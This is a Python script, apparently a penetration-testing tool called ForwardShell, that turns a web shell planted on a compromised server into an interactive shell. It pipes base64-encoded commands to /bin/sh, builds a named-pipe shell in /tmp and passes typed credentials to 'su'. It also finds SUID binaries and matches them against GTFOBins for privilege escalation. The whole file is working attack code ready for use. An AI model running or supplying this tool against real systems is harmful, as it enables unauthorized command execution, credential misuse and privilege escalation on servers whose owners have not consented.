#!/usr/bin/env python3
import requests, signal, sys, time, threading
import argparse, readline, re
from base64 import b64encode

def CustomColor(color):
    color = color.lstrip("#")
    r = int(color[0:2], 16)
    g = int(color[2:4], 16)
    b = int(color[4:6], 16)
    return "\033[38;2;%s;%s;%sm" % (r, g, b)

rojo = CustomColor("#FF0000")
azul = CustomColor("#0042FF")
close = "\033[0m"

inputMK = "/tmp/input"
outputMK = "/tmp/output"
delinput = "/bin/rm %s" % inputMK
deloutput = "/bin/rm %s" % outputMK

def ctrl_c(sig, frame):
    print(rojo + "\n\t[!] Exiting...")
    try:
        Run(delinput)
        Run(deloutput)
    except:
       None
    sys.exit(0)

signal.signal(signal.SIGINT, ctrl_c)

def Run(cmd):
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')

    CreateMK = {
       'cmd': 'echo "%s" | base64 -d | /bin/sh' % cmd
    }

    request = requests.get(webshell, params=CreateMK, timeout=2, proxies=proxies)

    if request.status_code == 404:
       return None
    else:
       return (request.text).strip()

def GetShell():
    mkfifo = "mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (inputMK, inputMK, outputMK)
    try:
        test = Run(mkfifo)
    except requests.exceptions.ReadTimeout as e:
        return True

def Write(cmd):
    writeF = {
        'cmd': 'echo "%s" > %s' % (cmd, inputMK)
    }
    r = requests.get(webshell, params=writeF, proxies=proxies)

def Read():
    clearoutput = "echo '' > %s" % outputMK
    readoutput = "/bin/cat %s" % outputMK
    while True:
        output = Run(readoutput)
        if output:
            print(output)
            Run(clearoutput)
        time.sleep(1)

def getSUID():
    url = "https://gtfobins.github.io/#+suid"
    request = requests.get(url).text

    suid = re.findall(r'.*/#suid', request)

    find = {
        'cmd': 'find / -perm -4000 2>/dev/null'
    }

    mysuid = (requests.get(webshell, params=find).text).split()

    for x in mysuid:
        Bsuid = x.split('/')[-1]
        for binary in suid:
            binary = binary.split('/')[2]
            if Bsuid == binary:
                print(azul + x + f" -> https://gtfobins.github.io/gtfobins/{Bsuid}/#suid")

def getopts():
    parser = argparse.ArgumentParser(description='ForwardShell')
    parser.add_argument('-w', required=True, dest='webshell', help='Webshell Path Ej: http//127.0.0.1/shell.php')
    parser.add_argument('-p', '--proxy', dest='proxy', help='Proxy Ej: socks5://127.0.0.1:1080')
    return parser.parse_args().webshell, parser.parse_args().proxy

def ChangeUser():
    user = input(azul + "USER: " + close)
    user = "su " + user
    password = input(azul + "PASSWORD: " + close)
    Write(user)
    Write(password)

def CommandHelp():
    print(azul + "CHUS -> Cambiar de usuario.")
    print("SUID -> Binarios con permisos SUID potenciales a una escalada de privilegios.")

webshell, proxy = getopts()

proxies = None

if proxy:
    proxies = {
        'http': '%s' % proxy
    }

thread = threading.Thread(target=Read, args=())
thread.daemon = True
thread.start()

if __name__ == "__main__":
    connect = GetShell()
    if connect == True:
        print(azul + "Comandos especiales -> HELP")
        while True:
            cmd = input(rojo + "$ " + close)
            if cmd == "HELP":
                CommandHelp()
            elif cmd == "SUID":
                getSUID()
            elif cmd == "CHUS":
                ChangeUser()
            else:
                Write(cmd)
                time.sleep(1)
